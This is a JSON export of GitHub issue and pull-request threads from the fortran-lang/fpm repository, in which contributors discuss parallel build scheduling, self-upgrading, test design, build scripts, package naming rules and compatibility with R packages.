{
    "name": "fortran-lang/fpm",
    "issues": [
        {
            "number": 345,
            "user": "LKedward",
            "date": "2021-01-29 12:43:12+00:00",
            "title": "Update: fpm_backend with dynamic openmp scheduling",
            "text": "I noticed the parallel compilation time for my stdlib-fpm package was quite poor (on 4 threads) and realised the default static scheduling of threads was causing poor utilisation since compilation times can vary significantly between individual targets. (This is less of a problem for higher core counts)\nThis PR makes dynamic scheduling explicit when using OpenMP for parallel compilation which gives much better utilisation (2x improvement for stdlib-fpm) and avoids implementation-dependent choice of scheduling. We have no pressing need for static scheduling and the overhead for dynamic scheduling appears to be small compared to the time for compilation.",
            "comments": []
        },
        {
            "number": 344,
            "user": "milancurcic",
            "date": "2021-01-27 20:50:53+00:00",
            "title": "Using fpm to upgrade fpm itself",
            "text": "Say I have fpm-0.1.3 and want to upgrade to current master or some future tag like v0.1.4. After the step 2 of #253 is implemented (so that the fpm.toml is in root dir), I think this should be possible by going through the following steps:\n\nfpm new a dummy project.\nAdd fpm as a dependency to the manifest and specify the v0.1.4 tag.\nRun fpm install. This will build the fpm library and binary as a dependency and put it to ~/.local/bin.\n\nThis will be somewhat awkward and not easy to do. Having the fpm upgrade command do this for you would be useful and nice UX I think.\nWhat do you think?",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-01-28 08:05:22+00:00",
                    "text": "This workflow can't work, executables are currently only installed from the root project but not from the dependencies and I don't think it is a good idea to change this behaviour.\nMaybe a more pip like syntax could be desirable here\nfpm install https://github.com/fortran-lang/fpm\n\nThis would clone into a temporary directory, build the project and install into ~/.local/bin."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-01-28 14:49:18+00:00",
                    "text": "Yes, I didn't suggest that workflow as a solution, but used it as an example of what the user would have to do if it had worked as I thought.\nfpm install https://github.com/fortran-lang/fpm\n\nseems nice to me, though not as easy as fpm upgrade. What do you think about this command being an alias for what you suggested?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-28 14:54:29+00:00",
                    "text": "fpm upgrade would require a local registry of fpm installed packages to check for all packages that should be updated."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-01-28 15:02:07+00:00",
                    "text": "Why? What fpm installed packages depend on an fpm binary?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-28 15:04:45+00:00",
                    "text": "Ah, now I understand, we are talking about a self-upgrade command here. I thought we are talking about a general upgrade strategy and fpm was used as example."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-28 16:26:43+00:00",
                    "text": "Just as a note, self-upgrading programs are usually not well-received in most packaging ecosystems (except maybe in their own one). The user experience of updating fpm would preferably boil down to pacman -Syu fpm, brew upgrade fpm or mamba update fpm. I'm not sure if fpm has to roll its own self-updating strategy at all."
                },
                {
                    "user": "epagone",
                    "date": "2021-01-28 16:35:56+00:00",
                    "text": "I also add that I think the misunderstanding above suggests one more potential problem: IIRC fpm update updates the dependencies of the project, whereas the proposed fpm upgrade would be an upgrade of fpm itself. This is somehow inconsistent and can confuse the user."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-01-28 16:46:39+00:00",
                    "text": "self-upgrading programs are usually not well-received in most packaging ecosystems (except maybe in their own one)\n\nThis is no surprise for obvious reasons. I would too recommend that people don't write self-upgrading fpm packages, but to use fpm to do that for them. :)\n\nThe user experience of updating fpm would preferably boil down to pacman -Syu fpm, brew upgrade fpm or mamba update fpm.\n\nIn theory, I think you're right, but in practice it doesn't work. There are so many system-specific package managers that there would be a lot of work for the fpm developers to keep shipping updates on all of them. System-specific managers also have an end-of-life for updates.\nI don't think this is a priority now, but wanted to get a pulse from people. It could also be a plugin (#211) or 3rd party tool, so people like me who want to use it, can."
                },
                {
                    "user": "brocolis",
                    "date": "2021-01-28 19:14:22+00:00",
                    "text": "On Windows there's a problem when trying to upgrade a program that is currently running (already in use Error). On Linux, it should work.\nTentative implementation\nhttps://gist.github.com/brocolis/e2fc06743652f939d95d351b16721f5c"
                }
            ]
        },
        {
            "number": 343,
            "user": "awvwgk",
            "date": "2021-01-23 18:18:13+00:00",
            "title": "Fortran fpm help_test invokes fpm",
            "text": "The help_test currently invokes fpm, this usually triggers a complete rebuild of both debug and release version unconditionally.\n\n  \n    \n      fpm/fpm/test/help_test/help_test.f90\n    \n    \n        Lines 21 to 46\n      in\n      c485357\n    \n    \n    \n    \n\n        \n          \n           ! debug version \n        \n\n        \n          \n           'fpm run -- --version                           ',& ! verify fpm version being used \n        \n\n        \n          \n           'fpm run -- --help        > fpm_scratch_help.txt',& \n        \n\n        \n          \n           'fpm run -- help new     >> fpm_scratch_help.txt',& \n        \n\n        \n          \n           'fpm run -- help update  >> fpm_scratch_help.txt',& \n        \n\n        \n          \n           'fpm run -- build --help >> fpm_scratch_help.txt',& \n        \n\n        \n          \n           'fpm run -- help run     >> fpm_scratch_help.txt',& \n        \n\n        \n          \n           'fpm run -- help test    >> fpm_scratch_help.txt',& \n        \n\n        \n          \n           'fpm run -- help runner  >> fpm_scratch_help.txt',& \n        \n\n        \n          \n           'fpm run -- help install >> fpm_scratch_help.txt',& \n        \n\n        \n          \n           'fpm run -- help list    >> fpm_scratch_help.txt',& \n        \n\n        \n          \n           'fpm run -- help help    >> fpm_scratch_help.txt',& \n        \n\n        \n          \n           'fpm run -- --version    >> fpm_scratch_help.txt',& \n        \n\n        \n          \n           ! release version  \n        \n\n        \n          \n           'fpm run --release -- --version                           ',& ! verify fpm version being used \n        \n\n        \n          \n           'fpm run --release -- --help        > fpm_scratch_help3.txt',& \n        \n\n        \n          \n           'fpm run --release -- help new     >> fpm_scratch_help3.txt',& \n        \n\n        \n          \n           'fpm run --release -- help update  >> fpm_scratch_help3.txt',& \n        \n\n        \n          \n           'fpm run --release -- build --help >> fpm_scratch_help3.txt',& \n        \n\n        \n          \n           'fpm run --release -- help run     >> fpm_scratch_help3.txt',& \n        \n\n        \n          \n           'fpm run --release -- help test    >> fpm_scratch_help3.txt',& \n        \n\n        \n          \n           'fpm run --release -- help runner  >> fpm_scratch_help3.txt',& \n        \n\n        \n          \n           'fpm run --release -- help install >> fpm_scratch_help3.txt',& \n        \n\n        \n          \n           'fpm run --release -- help list    >> fpm_scratch_help3.txt',& \n        \n\n        \n          \n           'fpm run --release -- help help    >> fpm_scratch_help3.txt',& \n        \n\n        \n          \n           'fpm run --release -- --version    >> fpm_scratch_help3.txt',& \n        \n    \n  \n\n\nIt might also invoke another version of fpm or completely fail if no fpm is in the PATH.",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2021-01-24 03:06:58+00:00",
                    "text": "A lot has changed since it was written, including where a \"run\" only did a build test if the binary was missing, but it was my understandng that each test was run in an environment that was created on demand and included the fpm command. It is running the help on the latest version built by the fpm command. I have not looked recently at a build log but the last time I looked it displayed the expected version number and did not show a build of fpm itself in the log file.  So it has been testing the latest version successfully in the manner expected.  Need a better definition of exactly how the test environment is deployed that the tests run in, but what you describe sounds basically what would be desired if the test environment is set up the way I thought; so need some more details, as I believe those conditions are not supposed to occur for the test environment."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-24 07:30:31+00:00",
                    "text": "You can see a new build starting in the testing environment at https://github.com/fortran-lang/fpm/runs/1754249868?check_suite_focus=true#step:12:2331 in the test step.\nAlso a common case I encountered this was when testing a bootstrapped build with\nfpm run -- test"
                },
                {
                    "user": "urbanjost",
                    "date": "2021-01-24 15:15:42+00:00",
                    "text": "It builds the latest version if required and runs the new copy to verify it gets the expected results. It is slower than expected but is doing the intended test. I believe there is an item open to add more actual fpm tests; but testing the actual executable in the CLI and help tests was intentional. I might have misunderstood the exact nature of the test environment?  Is it overwriting something? I thought the test environment was created on the fly specifically to do testing like this. What exactly is damaged?"
                },
                {
                    "user": "LKedward",
                    "date": "2021-01-24 18:16:43+00:00",
                    "text": "The rebuild appears to be because the test invokes both the debug and --release configurations. In the CI, the --release version is not built prior to running the tests and hence it is built during execution of help_test.\nI would say that the desired behaviour for tests is to test the current build configuration only. i.e. fpm test tests the debug configuration and fpm test --release only tests the --release configuration. The reason for this is that Haskell fpm allows other configurations as specified by --flag and in fact this is what is used in the CI.\nThe --release version is not directly built at all by the CI since the release version used for binaries is specified explicitly with --flag in order to get static executables:\n\n  \n    \n      fpm/.github/workflows/CI.yml\n    \n    \n         Line 36\n      in\n      c485357\n    \n    \n    \n    \n\n        \n          \n           RELEASE_FLAGS: --flag --static --flag -g --flag -fbacktrace --flag -O3 \n        \n    \n  \n\n\nHence this test is not actually running at all for the binary release version specified in our CI.\nThis problem is related to #328 in terms of a test needing information about its context. A possible solution suggested by Brad is to provide environment variables for the build output directory, however this does rely on some specification of the output file structure which has thus far been avoided.\nIt is worth noting also that cli_test solves a similar problem by providing an alternate entry point within the test executable instead of invoking the main fpm executable.."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-01-24 20:10:47+00:00",
                    "text": "I made the cli_test version before discussions about just what the test environment was. During development of the  help_test I made inquiries about whether fpm could be called and at the time that apparently was considered OK. I was under the impression the test environment was a virtual platform created on demand for the tests and had the f-fpm command in it's path.\nSo exactly what is the test platform? Unit tests etc. are satisfactory for testing procedures and objects (I have used such tests before they had a name) but at some point if you are building an application you want to test the application, both test and production versions; especially since I do not even have several of the environments available that the tests run on.  So what is the best way to call the latest version of the program fpm from a test? Even if not done for fpm itself an environment variable giving a path to a built version would seem reasonable. I\nPS:\nI am particularly surprised the test environment even has h-fpm in it; I have been using f-fpm for months on different platforms just bootstrapping it on machines with just gfortran and git."
                },
                {
                    "user": "LKedward",
                    "date": "2021-01-25 09:57:13+00:00",
                    "text": "Yes you're right @urbanjost, we do need a way of testing the application end-to-end in addition to unit tests. As you're aware we have previously found bugs with the CLI this way. The issue for discussion is what is the best way to call the executable from a test. For the reasons I mentioned I don't think calling fpm run from within the test is the best option. (The problem isn't with the test environment.)\nSince we don't have support for the required path environment variables currently (needs discussion/specification), do you think you would be able to test the same functionality by invoking the test executable like the cli_test?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-01-25 16:32:19+00:00",
                    "text": "I think that fpm needs a facility for integration/end-2-end testing.\n\nTests are specified for a given executable.\nTests are run in an isolated directory\nIt must be possible to specify\na. the runner (i.e. equivalent to fpm run --runner)\nb. command line arguments (i.e. equivalent to fpm run --args)\nc. Any inputs which should be copied into the isolated directory\nd. A way (optionally) of checking the \"screen\" outputs\ne. A way (optionally) of checking output files\n\nGiven that we would like to at least encourage these test be portable (i.e. work for any environment that fpm supports), d and e imply some sort of fpm specific scripting language. Or maybe fpm could carry around a Bash implementation to run these scripts?\nWhat do you guys think?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-25 16:41:50+00:00",
                    "text": "That would be a great addition, with 1, 2, 3a-c the important functionality. 3d and 3e could possibly be implemented outside of fpm by a package used as dev-dependency or by a combination of --runner and --args for a test. A related issue on this is #179."
                }
            ]
        },
        {
            "number": 342,
            "user": "awvwgk",
            "date": "2021-01-23 14:28:43+00:00",
            "title": "Fix broken link in contributing guidelines",
            "text": "Closes #340",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-01-23 15:04:39+00:00",
                    "text": "CI passes after rerunning so not sure if there's some non-determinism (?) in the tests. Think it was the 'help_test' that failed. (This test is actually a little problematic since it invokes fpm run to run Fortran fpm, but this doesn't test the release flags properly.)"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-23 18:28:41+00:00",
                    "text": "Think it was the 'help_test' that failed. (This test is actually a little problematic since it invokes fpm run to run Fortran fpm, but this doesn't test the release flags properly.)\n\nI opened #343 to discuss this."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-30 13:07:02+00:00",
                    "text": "Since this is a simple change, I'll go ahead and merge."
                }
            ]
        },
        {
            "number": 341,
            "user": "MarkWieczorek",
            "date": "2021-01-21 15:25:51+00:00",
            "title": "build script=\"make all\" no longer works",
            "text": "About a year ago, I was able to compile of complex project of mine using a pre-existing Makefile. After finding out about the environment variables $BUILD_DIR and $FC, this was pretty easy, I only needed to specify the following:\n[library]\nbuild-script = \"make all F95=$FC LIBPATH=$BUILD_DIR MODPATH=$BUILD_DIR\"\n\nHowever, I just updated to the latest alpha version (0.1.3), and this does't seem to work anymore: the makefile is not being executed and instead fpm is trying to compile the file in the src directory.\nIs there a way to specify using a prexisting makefile, or a way pass optional variables to the Makefile?",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2021-01-21 15:41:30+00:00",
                    "text": "Are you using the Haskell (fpm-haskell-0.1.3*) or Fortran (fpm-0.1.3*) client? This is not yet implemented in the latter."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-01-21 15:42:07+00:00",
                    "text": "Hello @MarkWieczorek,\nnote the build-script was an \"experimental\" feature available in the bootstrap fpm (the Haskell version). In the meantime a Fortran version of fpm has been built. You can check the manifest reference to see what is available.\nExecutables for the Haskell version can be found in the assets section of the latest release.\nA specification for the build-script feature is currently under discussion in #249."
                },
                {
                    "user": "MarkWieczorek",
                    "date": "2021-01-21 15:50:33+00:00",
                    "text": "I'm using the Fortran client. Should the Haskell version be the default? or is the plan to make the Fortran version the default?\nSo, I am guessing the answer is: Check back later\nThat's fine with me. However, I just want to emphasize that if you want old, or complicated projects to work with fpm, eventually, you will need to pass environment variables to the makefile!"
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-01-21 15:53:14+00:00",
                    "text": "The Fortran version is (and will remain) the default. The build script is just one of the features which hasn't been implemented yet in the Fortran version."
                },
                {
                    "user": "LKedward",
                    "date": "2021-01-22 10:01:23+00:00",
                    "text": "Thanks for the feedback @MarkWieczorek. Support for a custom build script is one of two (big) priority items remaining in our milestone . I'll close this issue as a duplicate of #219."
                }
            ]
        },
        {
            "number": 340,
            "user": "ivan-pi",
            "date": "2021-01-21 10:22:01+00:00",
            "title": "Link in contributing guide is broken",
            "text": "You can learn how from this great tutorial.\n\nThe link at the end of the contributing is broken. The correct address is:\nhttps://app.egghead.io/courses/how-to-contribute-to-an-open-source-project-on-github",
            "comments": []
        },
        {
            "number": 337,
            "user": "milancurcic",
            "date": "2021-01-12 22:20:53+00:00",
            "title": "Allow hyphens in fpm project names in \"fpm new\"",
            "text": "fpm new currently requires a package name to be a valid Fortran name.\n$ fpm new test-new\n<ERROR>the new directory basename must be an allowed                    \n       Fortran name. It must be composed of 1 to 63 ASCII               \n       characters and start with a letter and be composed               \n       entirely of alphanumeric characters [a-zA-Z0-9]                  \n       and underscores.                                                 \nSTOP 4\n\nTo have a hyphen in a package name is rather common though. For example, we have stdlib-cmake-example, there's toml-f and others, and I enjoy using hyphens as well.\nThis PR removes the restriction to use hyphens in new fpm package names in fpm new. The function that I used to do that (to_fortran_name()) can be easily expanded to other special characters if a need arises.\nIf you try this PR, you should get:\n$ ./fpm new test-new\n + mkdir -p test-new\n + cd test-new\n + mkdir -p test-new/src\n + mkdir -p test-new/test\n + mkdir -p test-new/app\n + git init test-new\nInitialized empty Git repository in /your/path/to/fpm/build/gfortran_debug/app/test-new/.git/\n\n$ cd test-new\n$ head fpm.toml \nname = \"test-new\"\nversion = \"0.1.0\"\nlicense = \"license\"\nauthor = \"Jane Doe\"\nmaintainer = \"jane.doe@example.com\"\ncopyright = \"2021 Jane Doe\"\n\n\n[library]\nsource-dir=\"src\"\n\n$ cat src/test-new.f90 \nmodule test_new\n  implicit none\n  private\n\n  public :: say_hello\ncontains\n  subroutine say_hello\n    print *, \"Hello, test-new!\"\n  end subroutine say_hello\nend module test_new\n\nI also updated the error message that you get if you pass some other special character:\n$ ./fpm new test^new\n<ERROR> the fpm project name must be made of up to 63 ASCII letters,    \n        numbers, underscores, or hyphens, and start with a letter.      \nSTOP 4\n\nWe can discuss at a later time if there are some other special characters that we'd want to allow.",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2021-01-13 01:32:29+00:00",
                    "text": "Forcing the directory, package, and module name to be the same and to be an allowable Fortran module name was a deliberate decision. Obviously, the module name must conform to these rules, and it was considered that the simplest solution was to enforce them all being consistent.  This disallows such options as the package and directory name being UTF-8 and so on so it is defnitely restrictive. I do not know if the discussions are still available, but now that there is auto-discovery it is far less of an issue. The question I have is should there be an option to name the package and the module independently instead of making a special case where dashes are replaced with underscores?  If we are going to relax the restriction I think it would be better to leave the default behavior as-is and allow for an optional parameter to name the directory and project. I do not know if UTF-8 or other characters are allowed or easily supported in all the places the name might appear, but I believe toml-f supports UTF-8.  So if we allowed any arbitrary name would it cause issues with git, github, gitlab, the fpm repository and/or toml files ?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-13 08:16:47+00:00",
                    "text": "I agree that we might have to enforce some restrictions on the project name (e.g. I would consider newlines always invalid), but requiring it to be a valid Fortran identifier seems harsh. Allowing more freedom in fpm-new is very welcome from my side (in fact all my fpm packages but one are using hyphens in the project name).\nI like the idea to just underscorify everything we can't use in Fortran, in case we encounter problems with the names of the targets, archive, directories a similar approach could be used as well. The limitations of the programming language shouldn't be imposed on the user in my opinion.\nAlso, cargo allows a --name option in the new subcommand to specify the project name independently from the project directory. For our case this doesn't solve the issue with the name of the module but I would consider this a placeholder anyway, so chances are good that it will be renamed."
                },
                {
                    "user": "LKedward",
                    "date": "2021-01-13 08:53:37+00:00",
                    "text": "Thanks @milancurcic, I too use hyphens commonly in package names and welcome this change. The proposed solution of replacing with underscores where needed seems reasonable.\nWith that said, I think the relevant discussion that drives the current behaviour is #153 (Prevent Name Collisions Between Packages) where it was agreed that all module names should be prefixed by the package name. This check is not yet implemented in fpm; when implemented, there will be a small burden on users to ensure modules are correctly prefixed by the fortranised package name. Alternatively, the module namespace prefix could be specified in the manifest separately."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2021-01-13 09:03:03+00:00",
                    "text": "As an aside: we should be thinking about the support for UTF-8. That is a\nrather tricky topic, as it may well depend on what the compilers allow\n(think of file names).\n\nNote: My remark is not to complicate matters for fpm, just to remind us of\nthe topic in general.\n\nOp wo 13 jan. 2021 om 09:53 schreef Laurence Kedward <\nnotifications@github.com>:\n\u2026\n Thanks @milancurcic <https://github.com/milancurcic>, I too use hyphens\n commonly in package names and welcome this change. The proposed solution of\n replacing with underscores where needed seems reasonable.\n\n With that said, I think the relevant discussion that drives the current\n behaviour is #153 <#153>\n (Prevent Name Collisions Between Packages) where it was agreed that all\n module names should be prefixed by the package name. This check is not yet\n implemented in *fpm*; when implemented, there will be a small burden on\n users to ensure modules are correctly prefixed by the fortranised package\n name. Alternatively, the module namespace prefix could be specified in the\n manifest separately.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#337 (comment)>, or\n unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR7SCYPKAPV6PIIPXCDSZVNSDANCNFSM4V74FQJQ>\n ."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-13 09:05:29+00:00",
                    "text": "For UTF-8 support I will link to the upstream issue at TOML-Fortran (toml-f/toml-f#3) as this will become relevant."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-01-13 17:17:46+00:00",
                    "text": "With this PR, I didn't mean to ignore #153, which I still think is important. But I forgot about it in the moment.\nWhen fpm checks that all module names do begin with the project name, the change in this PR will require an extra clause explaining the restriction to the user. For example:\n\nFpm requires that the names of all modules in your package begin with the package name. If your package name contains hyphens (-), the module names should have underscores (_) in place of hyphens.\n\nor similar. So there is a bit of burden that is being put on the user with this. On the other side, with this PR fpm new already generates correct module names with underscores instead of hyphens. Further, when the #153 check is implemented, fpm will be able to tell the user exactly how to prefix the module names. For example, if package name is \"my-fortran-lib\", fpm can report something like:\n<ERROR> All module names in this package must begin with \"my_fortran_lib\"."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-01-14 01:11:15+00:00",
                    "text": "Even now nothing obvious breaks if the directory is renamed, as I have done myself several times so I would prefer a second parameter for naming the directory to a non-default value, but at least for now this is satisfactory for the specific case of a dash.\nI can picture where the user might want the entire directory name to be a UTF8 string which could produce a project name of something like  \"___\" so in the long term I think this will need revisited,  but during the original discussion I think the conclusion was something along the lines \"of a consistent name is simplest and most intuitive, let us go with the restriction and revisit if if there are complaints\", which, lo and behold is the case so lets go with this as it covers the most common case and appears to be commonly desired.  If there are requests for other changes I think the additional option would be cleaner, but this has been the only request so far.\nI believe it is telling that other package managers appear to address this with an additional option, but apparently in the reverse order of precedence I would suggest (the name always names the directory and an alternate project name is allowed for).  After trying it that might be better, as it allows for things like fpm . --backfill.  So in the future if the name on \"new\" allows for any name, but if it is required you supply a \"Fortran-acceptable\" name  as well as the primary project name if the directory name is not one I would go with that.\nfpm new ANY_DIRECTORY_NAME --name PACKAGE_NAME\nappears to be how cargo handles this. I am wondering if anyone using cargo could see if PACKAGE_NAME is required with unusual directory names or if there are any other restrictions. The documentation I read does not mention it, but I wonder what would something like \"cargo --new ___\"  or \"cargo --new @\"  do.  And right now, what about \"fpm new ./---\" ? Obviously unlikely a Linux user in particular would use that particular name, but non-ASCII characters could produce something as bad."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-01-14 15:39:56+00:00",
                    "text": "I think there would be value in a CLI parameter to specify a directory name different from the project name. I have projects like this. For example, the repo and directory are called \"datetime-fortran\" and \"functional-fortran\" (to help them stand out on GitHub), but the fpm project names (and modules) are called \"datetime\" and \"functional\" because \"fortran\" is redundant in the context of fpm.\n\nI can picture where the user might want the entire directory name to be a UTF8 string which could produce a project name of something like \"___\" so in the long term I think this will need revisited\n\nNo, currently only hyphen is converted to an underscore. I don't think this should expand to all special ASCII characters and definitely not all Unicode. If the restriction is lifted, it should be on a character by character basis and motivated by user requests.\n\nAnd right now, what about \"fpm new ./---\" ?\n\nThis will error out because you need to start it with a letter. fpm new a--- should work with this PR but I didn't test it. I doubt this will be a common use of fpm new.\nThank you all for the feedback, I will go ahead and merge."
                }
            ]
        },
        {
            "number": 336,
            "user": "AndreMikulec",
            "date": "2021-01-06 00:49:06+00:00",
            "title": "Building R CRAN packages with Fortran code using \"fpm\" is not possible, but should be!",
            "text": "All,\nFirst,\nThank you for the wonderful work on the \"fpm\".\nSecond,\nIn the manual \"Writing R Extensions\"\nIn the section \"1.2.3 Using F9x code\"\nhttps://cran.r-project.org/doc/manuals/r-release/R-exts.html\nreads\nModern versions of Fortran support modules, \nwhereby compiling one source file creates a module file which is then included in others. \n(Module files typically have a .mod extension: they do \ndepend on the compiler used and so should never be included in a package.) \nThis creates a dependence which make will not know about \nand often causes installation with a parallel make to fail\n\nBut the page https://github.com/Fortran-lang/fpm/blob/master/PACKAGING.md\nreads in the section \"Single-module library\"\nfpm first ran gFortran to emit the binary object (math_constants.o) \nand module (math_constants.mod) files. \n. . .\nUniquely and exactly map a source file (.f90) to its object (.o) and module (.mod) files.\n\nIn conclusion,\nMay one consider creating the modules with the .f90 extension (instead of the .mod extension),\nso in the future, one can use \"fpm\" in the processes of building\nR CRAN package that contains Fortran source code.\nFortran is found in many places in the 20,000 R CRAN packages.\nThis could be a great area of expansion for the \"fpm\".\nIf \"fpm\" can get compatible as a helper method to build R CRAN packages that contain Fortran code,\nthen this situation may be a big boost to  \"fpm\" (and Fortran).\nHere are the Fortran files found in R CRAN packages.\n.f -> 4,192 hits\nhttps://github.com/search?q=org%3Acran+extension%3Af\n.f90 -> 881 hits\nhttps://github.com/search?q=org%3Acran+extension%3Af90\n.f95 -> 156 hits\nhttps://github.com/search?q=org%3Acran+extension%3Af95\nAndre Mikulec\nAndre_Mikulec@Hotmail.com",
            "comments": [
                {
                    "user": "certik",
                    "date": "2021-01-06 01:53:05+00:00",
                    "text": "Hi @AndreMikulec, we definitely want fpm to work with the R ecosystem. Can you expand on your proposal? I don't understand how it would help to rename .mod to .f90, or why that is a good idea.\nIn general, our approach is to first figure out a good workflow that makes sense for Fortran, and then work with other communities such as Spack, Conda, R, etc., how to make it work."
                },
                {
                    "user": "LKedward",
                    "date": "2021-01-06 12:07:16+00:00",
                    "text": "Hi @AndreMikulec, thanks for opening this issue.\nRegarding Fortran modules, fpm automatically works out the inter-module dependencies and builds objects in the correct order and in parallel where possible, so there is no need to worry about the .mod files.\nI am not familiar with R CRAN packages and how they are built, however I see no fundamental reason why fpm can't already be used to build the Fortran dependencies. It looks like the CRAN packages are in a compatible folder structure for fpm.\nAfter a brief look it looks like CRAN packages cannot have multiple Fortran modules in different files since, as you mention, module dependencies are not accounted for currently; using fpm would solve this issue."
                },
                {
                    "user": "AndreMikulec",
                    "date": "2021-01-10 04:10:25+00:00",
                    "text": "First\n\".mod\" is not-a-file-extension, of a file, that contains Fortran code.\nFile extensions\nhttp://fortranwiki.org/fortran/show/File+extensions\nThe \".mod\" file extension is a \"compiler specific thing\".  So, this not a  \"Fortran Package Manager?  So, is this a \"Compiler-Specific-Fortran Package Manager\"?\nA quick discussion is here:\nA primary problem for distributing a compiled library for a specific platform\nis that module files are compiler-specific.\n\nhttp://fortranwiki.org/fortran/show/Library+distribution\nSecond\nIn R,  to create a \"dll\" that is loadable into R, one does the following:\nR CMD SHLIB [options] files | linker options\nTherefore, one does, the following to create a .dll on windows (or to create an equivalent shared object on Linux, Mac, or Solaris).\nR CMD SHLIB  *.f90 \n(The command to create (and install) an R CRAN package that contains compiled Fortran is R CMD INSTALL (and this is just a thick wrapper (and more)  over 'R CMD SHLIB . . .'.\nIn the Fortran packaging system (if, it is, to be able to work with R Fortran compiling):\n\"R\" would replace \"gfortran\".  \"CMD SHLIB options\" would be, of course, options.  \"link options\" would be options, of course, sent to the linker.  The rest is controlled by either variables that were set when R was compiled or variables set in the environment where \"R CMD SHLIB . . .\" is ran.\nSummary\nWhat I am, essentially saying, is that the packaging system should more \"flexible\" than what is there now."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-10 09:10:13+00:00",
                    "text": "@AndreMikulec Thank you for your input on this.\nFrom my experience of interfacing Fortran projects with C and Python, the process of creating an extension for another language is quite orthogonal to reusing Fortran packages/modules in Fortran projects. Currently fpm focus primarily on the latter, but we want to make fpm more flexible to allow interfacing with other languages as well.\nIf I read the R CRAN documentation on extensions correctly a Fortran extension module must be bound either via iso_c_binding as C external to R or as non-module procedure using a Fortran 77 style implicit interface. This is quite similar to the approach used to bind to Python. In any case this requires to export a shared object, but in general no special attention beside include paths or link line arguments. Building shared objects is something fpm currently can't do, but should be able to do at some point.\nFrom the R CRAN documentation I get the impression that extensions all builds around the autoconf intrastructure and rely pretty heavily on automake and m4 features, but correct me if I'm wrong. Comparing this again to Python which relies heavily on setuptools to build extensions, I found that building Python extensions without setuptools becomes much easier.\nIn summary, we first have to give fpm some basic intercompatibility functionality and than build on-top of this more elaborated language specific extensions."
                },
                {
                    "user": "AndreMikulec",
                    "date": "2021-01-12 13:51:41+00:00",
                    "text": "R CMD SHLIB does not provide any infrastructure to interface Fortran to another language.  Interfacing to another language is not the objective.  Interfacing to another language (if the R package author wishes to do so), would be a function of the chosen compiler (of which can actually be many different compilers and OS platforms) and/or handwritten code (or code generated from an external helper tool) by the author.\nThe \"autoconf intrastructure\" does not matter.  The point is that, the situation would be useful to be able to replace out \"gfortran\" or \"ifort\" or \"whatever\", using \"R CMD SHLIB\", and replace out \".mod\" files with just \".f90\" files.\nThe replacement of gfortran\" or \"ifort\" or \"whatever\", using \"R CMD SHLIB\" should not be (obviously) too hard.\nHowever, leaving \"fpm\" hardcoded to use only \".mod\" files (to store Fortran module code) would eliminate the ability of a user of \"fpm\" to use R as an \"alternate\"(specific) compiler."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-12 14:44:18+00:00",
                    "text": "I think we are talking about different things here. There might be a confusion between shared modules and Fortran module files here. The creation of the shared module, which can be eventually loaded into R, does not depend on the Fortran module files.\nCreating a shared module is independent of the actual compilation of the Fortran source code to object files. Replacing the compiler with R CMD SHLIB would not yield the expected result in the context of fpm.\nThe important step for creation of the shared module from the already available object file following the naming convention required by R from the fpm side."
                }
            ]
        },
        {
            "number": 335,
            "user": "LKedward",
            "date": "2021-01-03 14:49:43+00:00",
            "title": "Fix: performance regression from #303",
            "text": "33ad2ce (#303) introduced a severe performance regression when checking for empty source files during the source parsing phase. This is particularly noticeable on Windows.\nThis PR adds a string_len_trim routine to check for empty source files instead of inefficiently using string_cat.\nI see 5-10x improvement in the time to construct the model from this PR for a project with ~80 source files.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-01-06 17:59:13+00:00",
                    "text": "I'm going ahead and merge this PR."
                }
            ]
        },
        {
            "number": 334,
            "user": "awvwgk",
            "date": "2021-01-03 13:33:23+00:00",
            "title": "Remove a name clash in the fpm testsuite",
            "text": "local variable uses same name as used module (testsuite)\n\nSee: https://groups.google.com/g/comp.lang.fortran/c/FdOcg3dGuK4",
            "comments": []
        },
        {
            "number": 331,
            "user": "urbanjost",
            "date": "2020-12-28 20:48:54+00:00",
            "title": "name=\"executable-name\"  allows names with slashes",
            "text": "Is it an intended feature for executable names to contains slashes?  Does not create a file outside of the package and works and could be useful for avoiding name conflicts but, particularly because you have to specify a source directory name in something like [[executable]]  I was assuming the name would have to be a simple base name; was testing how it worked with UTF-8 and checking for any ICE or what error messages would be produced from \"incorrect\" input and found it worked for the most part, but if that is not intended I think it should be checked for and flagged.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-12-29 12:11:09+00:00",
                    "text": "With the label \"name\" I would say that this is not an intended feature in which case I agree that this should be checked somewhere."
                }
            ]
        },
        {
            "number": 329,
            "user": "certik",
            "date": "2020-12-23 00:25:44+00:00",
            "title": "Handle `-ffast-math`",
